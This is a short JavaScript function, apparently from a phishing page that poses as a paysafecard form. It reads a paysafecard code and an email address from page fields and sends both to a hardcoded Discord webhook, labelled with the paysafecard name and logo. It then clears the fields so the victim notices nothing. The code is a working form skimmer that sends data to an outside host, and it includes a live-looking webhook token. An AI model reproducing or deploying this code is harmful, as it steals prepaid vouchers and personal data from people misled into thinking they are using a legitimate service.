function sendMessage(arg, arg1) {
    var psc = document.getElementById(arg1).value;
    var mail = document.getElementById(arg).value;
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/937774370758217798/MDw5rue1bIKZ_BatmMjm-3zxQEw7ErPjYbsPJ-Cc4MFPt3RMab0K5ymWeeASaM3NY51s");
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
        username: "paysafecard",
        avatar_url: "https://teamnet-software.pl/wp-content/uploads/2019/09/paysafecard-logo-svg.png",
        content: 'psc: ' + psc + ' mail: ' + mail,
    }
    request.send(JSON.stringify(params));
    document.getElementById(arg).value = '';
    document.getElementById(arg1).value = '';
    // $(".modal-content").hide();
    // $(".modal-backdrop").hide();
}